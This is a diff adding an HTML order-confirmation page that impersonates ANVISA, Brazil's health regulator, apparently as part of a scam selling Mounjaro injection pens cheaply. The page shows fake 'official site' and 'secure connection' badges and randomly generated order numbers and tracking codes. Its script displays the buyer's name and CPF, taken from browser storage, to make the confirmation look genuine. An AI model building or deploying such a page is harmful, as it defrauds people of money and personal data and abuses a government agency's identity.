@@ -1,0 +1,595 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Compra Realizada com Sucesso | ANVISA</title>
+  <link href="https://cdn.tailwindcss.com" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #f8f9fa;
+    }
+    
+    .main-title {
+      font-size: 24px;
+      font-weight: 700;
+      color: #1351b4;
+      margin-bottom: 8px;
+    }
+    
+    .subtitle {
+      font-size: 16px;
+      color: #666666;
+      margin-bottom: 24px;
+    }
+    
+    .sticky-header {
+      position: sticky;
+      top: 0;
+      background-color: white;
+      z-index: 50;
+      transition: box-shadow 0.3s ease;
+    }
+    
+    .sticky-header.shadow {
+      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+    }
+    
+    .secure-badge {
+      display: inline-flex;
+      align-items: center;
+      background-color: #f0f7ff;
+      color: #1351b4;
+      padding: 6px 12px;
+      border-radius: 16px;
+      font-size: 12px;
+      font-weight: 600;
+    }
+    
+    .secure-badge i {
+      margin-right: 4px;
+    }
+    
+    .success-container {
+      background-color: white;
+      border-radius: 12px;
+      box-shadow: 0 4px 6px rgba(0,0,0,0.05);
+      overflow: hidden;
+      max-width: 700px;
+      margin: 0 auto;
+      text-align: center;
+    }
+    
+    .success-header {
+      background-color: #f0f7ff;
+      padding: 20px;
+      border-bottom: 1px solid #e0e7ff;
+    }
+    
+    .success-content {
+      padding: 40px 30px;
+    }
+    
+    .success-icon {
+      width: 80px;
+      height: 80px;
+      background-color: #dcfce7;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 24px;
+    }
+    
+    .success-icon i {
+      font-size: 40px;
+      color: #16a34a;
+    }
+    
+    .success-title {
+      font-size: 24px;
+      font-weight: 700;
+      color: #16a34a;
+      margin-bottom: 12px;
+    }
+    
+    .success-subtitle {
+      font-size: 16px;
+      color: #4b5563;
+      margin-bottom: 24px;
+    }
+    
+    .order-details {
+      background-color: #f9fafb;
+      border-radius: 8px;
+      padding: 16px;
+      margin-bottom: 24px;
+      border: 1px solid #e5e7eb;
+      text-align: left;
+    }
+    
+    .order-title {
+      font-size: 16px;
+      font-weight: 600;
+      color: #1351b4;
+      margin-bottom: 12px;
+    }
+    
+    .order-info {
+      display: flex;
+      margin-bottom: 8px;
+    }
+    
+    .order-label {
+      width: 40%;
+      font-size: 14px;
+      color: #6b7280;
+    }
+    
+    .order-value {
+      width: 60%;
+      font-size: 14px;
+      font-weight: 500;
+      color: #4b5563;
+    }
+    
+    .delivery-estimate {
+      background-color: #eff6ff;
+      border-radius: 8px;
+      padding: 16px;
+      margin-bottom: 24px;
+      border: 1px solid #bfdbfe;
+      border-left: 4px solid #3b82f6;
+    }
+    
+    .estimate-title {
+      font-size: 16px;
+      font-weight: 600;
+      color: #1351b4;
+      margin-bottom: 8px;
+      display: flex;
+      align-items: center;
+    }
+    
+    .estimate-title i {
+      margin-right: 8px;
+      color: #3b82f6;
+    }
+    
+    .estimate-text {
+      font-size: 14px;
+      color: #4b5563;
+    }
+    
+    .btn {
+      padding: 12px 20px;
+      border-radius: 6px;
+      font-weight: 600;
+      font-size: 16px;
+      transition: all 0.2s ease;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+    }
+    
+    .btn-primary {
+      background-color: #1351b4;
+      color: white;
+      border: none;
+    }
+    
+    .btn-primary:hover {
+      background-color: #0c3d8a;
+    }
+    
+    .btn-secondary {
+      background-color: #f3f4f6;
+      color: #4b5563;
+      border: 1px solid #d1d5db;
+    }
+    
+    .btn-secondary:hover {
+      background-color: #e5e7eb;
+    }
+    
+    .btn i {
+      margin-right: 8px;
+    }
+    
+    .next-steps {
+      margin-top: 24px;
+      padding-top: 24px;
+      border-top: 1px solid #e5e7eb;
+    }
+    
+    .next-steps-title {
+      font-size: 18px;
+      font-weight: 600;
+      color: #1351b4;
+      margin-bottom: 16px;
+    }
+    
+    .steps-list {
+      text-align: left;
+      margin-bottom: 24px;
+    }
+    
+    .step-item {
+      display: flex;
+      margin-bottom: 16px;
+    }
+    
+    .step-number {
+      width: 24px;
+      height: 24px;
+      border-radius: 50%;
+      background-color: #1351b4;
+      color: white;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 12px;
+      font-weight: 600;
+      margin-right: 12px;
+      flex-shrink: 0;
+    }
+    
+    .step-content {
+      font-size: 14px;
+      color: #4b5563;
+    }
+    
+    .step-content h4 {
+      font-size: 16px;
+      font-weight: 600;
+      color: #1f2937;
+      margin-bottom: 4px;
+    }
+    
+    .vlibras-icon {
+      position: fixed;
+      right: 10px;
+      top: 50%;
+      transform: translateY(-50%);
+      z-index: 1000;
+    }
+    
+    .tracking-code {
+      font-family: monospace;
+      font-size: 16px;
+      font-weight: 600;
+      color: #1351b4;
+      padding: 8px 12px;
+      background-color: #f0f7ff;
+      border-radius: 4px;
+      border: 1px dashed #bfdbfe;
+      margin-top: 4px;
+      display: inline-block;
+    }
+    
+    .customer-service {
+      margin-top: 24px;
+      padding: 16px;
+      background-color: #f9fafb;
+      border-radius: 8px;
+      border: 1px solid #e5e7eb;
+      text-align: left;
+    }
+    
+    .customer-service-title {
+      font-size: 16px;
+      font-weight: 600;
+      color: #1351b4;
+      margin-bottom: 8px;
+      display: flex;
+      align-items: center;
+    }
+    
+    .customer-service-title i {
+      margin-right: 8px;
+      color: #1351b4;
+    }
+    
+    .customer-service-text {
+      font-size: 14px;
+      color: #4b5563;
+      margin-bottom: 12px;
+    }
+    
+    .customer-service-contact {
+      display: flex;
+      align-items: center;
+      margin-bottom: 8px;
+    }
+    
+    .customer-service-contact i {
+      color: #1351b4;
+      margin-right: 8px;
+      width: 16px;
+    }
+    
+    .customer-service-contact span {
+      font-size: 14px;
+      color: #4b5563;
+    }
+    
+    .customer-service-contact strong {
+      font-weight: 600;
+      color: #1f2937;
+    }
+  </style>
+</head>
+<body>
+  <img src="https://i.ibb.co/btmZWCB/IMG-3113.jpg" alt="Government header" class="w-screen">
+  <div class="sticky-header">
+    <div class="container mx-auto px-4 border-b border-[#0000001a]">
+      <div class="flex items-center justify-between py-2">
+        <div class="flex items-center">
+          <i class="fas fa-bars text-sm text-[#1451B4] mr-4 relative -top-1"></i>
+          <p class="text-[14px] text-[#333333] -ml-[5px] leading-tight">
+            Centro de Verificação Digital | ANVISA
+          </p>
+        </div>
+        <div class="flex items-center space-x-4">
+          <i class="fas fa-shield-alt text-sm text-green-600 relative -top-1"></i>
+          <i class="fas fa-lock text-sm text-green-600 relative -top-1"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+  
+  <div class="container mx-auto px-4">
+    <div class="py-4">
+      <div class="flex items-center space-x-2 text-[13px]">
+        <a class="text-[#1451B4]" href="#"><i class="fas fa-home text-sm text-[#1451B4]"></i></a>
+        <span class="text-[#9E9D9D]">&gt;</span>
+        <a class="text-[#1451B4]" href="#">Portal Cidadão</a>
+        <span class="text-[#9E9D9D]">&gt;</span>
+        <a class="text-[#1451B4]" href="#">Verificação de Acesso</a>
+        <span class="text-[#9E9D9D]">&gt;</span>
+        <span class="font-bold">Pedido Confirmado</span>
+      </div>
+    </div>
+  </div>
+
+  <main class="max-w-3xl mx-auto px-4 py-6">
+    <div class="mb-6">
+      <h2 class="main-title">
+        Confirmação de Pedido
+      </h2>
+      <p class="subtitle">
+        Seu pedido foi realizado com sucesso!
+      </p>
+    </div>
+    
+    <div class="flex flex-wrap justify-center gap-3 my-4">
+      <span class="secure-badge"><i class="fas fa-shield-alt"></i> Site Oficial</span>
+      <span class="secure-badge"><i class="fas fa-lock"></i> Conexão Segura</span>
+      <span class="secure-badge"><i class="fas fa-database"></i> Dados Protegidos</span>
+    </div>
+    
+    <div class="success-container">
+      <div class="success-header">
+        <h3 class="text-lg font-semibold text-[#0c326f]">Mounjaro - Aquisição Confirmada</h3>
+      </div>
+      
+      <div class="success-content">
+        <div class="success-icon">
+          <i class="fas fa-check"></i>
+        </div>
+        
+        <h2 class="success-title">Pedido Realizado com Sucesso!</h2>
+        <p class="success-subtitle">Obrigado pela sua aquisição. Seu pedido foi recebido e está sendo processado.</p>
+        
+        <div class="order-details">
+          <h3 class="order-title">Detalhes do Pedido</h3>
+          
+          <div class="order-info">
+            <div class="order-label">Número do Pedido:</div>
+            <div class="order-value" id="orderNumber">BRA25044789</div>
+          </div>
+          
+          <div class="order-info">
+            <div class="order-label">Data do Pedido:</div>
+            <div class="order-value" id="orderDate">17/04/2025</div>
+          </div>
+          
+          <div class="order-info">
+            <div class="order-label">Cliente:</div>
+            <div class="order-value" id="clientName">Carregando...</div>
+          </div>
+          
+          <div class="order-info">
+            <div class="order-label">CPF:</div>
+            <div class="order-value" id="clientCpf">Carregando...</div>
+          </div>
+          
+          <div class="order-info">
+            <div class="order-label">Produto:</div>
+            <div class="order-value">Mounjaro (Tirzepatida) 2,5mg</div>
+          </div>
+          
+          <div class="order-info">
+            <div class="order-label">Quantidade:</div>
+            <div class="order-value">Ciclo de 3 meses – 4 canetas</div>
+          </div>
+          
+          <div class="order-info">
+            <div class="order-label">Valor do Pedido:</div>
+            <div class="order-value">R$ 197,90</div>
+          </div>
+          
+          <div class="order-info">
+            <div class="order-label">Status:</div>
+            <div class="order-value"><span class="text-green-600 font-semibold">Confirmado</span></div>
+          </div>
+        </div>
+        
+        <div class="delivery-estimate">
+          <h4 class="estimate-title">
+            <i class="fas fa-truck"></i> Estimativa de Entrega
+          </h4>
+          <p class="estimate-text">
+            Seu pedido será enviado em até 2 dias úteis. A previsão de entrega é de 5 a 10 dias úteis, dependendo da sua localidade.
+          </p>
+          <div class="mt-2">
+            <p class="font-semibold text-sm text-slate-700">Código de rastreamento:</p>
+            <div class="tracking-code" id="trackingCode">JD2504BR78X125</div>
+          </div>
+        </div>
+        
+        <div class="next-steps">
+          <h3 class="next-steps-title">Próximos Passos</h3>
+          
+          <div class="steps-list">
+            <div class="step-item">
+              <div class="step-number">1</div>
+              <div class="step-content">
+                <h4>E-mail de Confirmação</h4>
+                <p>Você receberá um e-mail com os detalhes completos do seu pedido e informações de rastreamento.</p>
+              </div>
+            </div>
+            
+            <div class="step-item">
+              <div class="step-number">2</div>
+              <div class="step-content">
+                <h4>Preparação e Envio</h4>
+                <p>Seu pedido será preparado e enviado com embalagem refrigerada especial para garantir a qualidade do medicamento.</p>
+              </div>
+            </div>
+            
+            <div class="step-item">
+              <div class="step-number">3</div>
+              <div class="step-content">
+                <h4>Rastreamento</h4>
+                <p>Você poderá acompanhar seu pedido a qualquer momento através do código de rastreamento fornecido.</p>
+              </div>
+            </div>
+            
+            <div class="step-item">
+              <div class="step-number">4</div>
+              <div class="step-content">
+                <h4>Recebimento</h4>
+                <p>Ao receber o produto, verifique se a embalagem está intacta e armazene o medicamento na geladeira conforme as instruções.</p>
+              </div>
+            </div>
+          </div>
+          
+          <div class="customer-service">
+            <h4 class="customer-service-title">
+              <i class="fas fa-headset"></i> Atendimento ao Cliente
+            </h4>
+            <p class="customer-service-text">
+              Se você tiver qualquer dúvida ou precisar de assistência com seu pedido, nossa equipe de atendimento está disponível para ajudar.
+            </p>
+            <div class="customer-service-contact">
+              <i class="fas fa-envelope"></i>
+              <span><strong>E-mail:</strong> atendimento@anvisa.gov.br</span>
+            </div>
+            <div class="customer-service-contact">
+              <i class="fas fa-phone-alt"></i>
+              <span><strong>Telefone:</strong> 0800 642 9782</span>
+            </div>
+            <div class="customer-service-contact">
+              <i class="fas fa-clock"></i>
+              <span><strong>Horário:</strong> Segunda a sexta, das 8h às 18h</span>
+            </div>
+          </div>
+          
+          <div class="flex justify-center mt-6">
+            <a href="/" class="btn btn-primary">
+              <i class="fas fa-home"></i> Página Inicial
+            </a>
+          </div>
+        </div>
+      </div>
+    </div>
+  </main>
+  
+  <div class="w-full mt-6">
+    <img src="https://i.ibb.co/DHjL5PH/IMG-3117.jpg" alt="Imagem de rodapé do site" class="w-full">
+  </div>
+  
+  <a href="#" class="vlibras-icon">
+    <img src="https://cdn.jsdelivr.net/gh/spbgovbr-vlibras/vlibras-portal@dev/app/assets/access_icon.svg" alt="Ícone de acessibilidade em Libras" class="w-10 h-10">
+  </a>
+  
+  <script>
+    // Gerar número de pedido aleatório
+    function generateOrderNumber() {
+      const prefix = "BRA";
+      const year = "25";
+      const randomNum = Math.floor(Math.random() * 1000000).toString().padStart(6, '0');
+      return prefix + year + randomNum;
+    }
+    
+    // Gerar código de rastreamento aleatório
+    function generateTrackingCode() {
+      const prefixes = ["JD", "BR", "DL", "CP"];
+      const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
+      const year = "25";
+      const randomNum = Math.floor(Math.random() * 100).toString().padStart(2, '0');
+      const countryCode = "BR";
+      const suffix = Math.floor(Math.random() * 1000000).toString(36).toUpperCase().substring(0, 5);
+      return prefix + year + randomNum + countryCode + suffix;
+    }
+    
+    // Formatar data atual
+    function formatCurrentDate() {
+      const date = new Date();
+      return date.toLocaleDateString('pt-BR');
+    }
+    
+    // Formatar CPF para exibição (XXX.XXX.XXX-XX)
+    function formatCPF(cpf) {
+      if (!cpf) return '';
+      
+      // Remover caracteres não numéricos
+      cpf = cpf.replace(/\D/g, '');
+      
+      // Verificar se o CPF tem 11 dígitos
+      if (cpf.length !== 11) return cpf;
+      
+      // Formatar no padrão XXX.XXX.XXX-XX
+      return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+    }
+    
+    // Função para preencher os detalhes do pedido
+    function fillOrderDetails() {
+      // Gerar número de pedido e código de rastreamento
+      document.getElementById('orderNumber').textContent = generateOrderNumber();
+      document.getElementById('orderDate').textContent = formatCurrentDate();
+      document.getElementById('trackingCode').textContent = generateTrackingCode();
+      
+      // Obter dados do cliente do localStorage
+      const nomeCompleto = localStorage.getItem('nomeCompleto') || '';
+      const cpfValidado = localStorage.getItem('cpfValidado') || '';
+      
+      // Formatar CPF
+      const cpfFormatado = formatCPF(cpfValidado);
+      
+      // Atualizar os elementos na página
+      document.getElementById('clientName').textContent = nomeCompleto || 'Cliente Anvisa';
+      document.getElementById('clientCpf').textContent = cpfFormatado || 'CPF não disponível';
+    }
+    
+    // Executar quando a página carregar
+    window.onload = function() {
+      fillOrderDetails();
+    };
+    
+    // Efeito de scroll na barra de navegação
+    window.addEventListener('scroll', function() {
+      var header = document.querySelector('.sticky-header');
+      if (window.pageYOffset > 0) {
+        header.classList.add('shadow');
+      } else {
+        header.classList.remove('shadow');
+      }
+    });
+  </script>
+</body>
+</html>
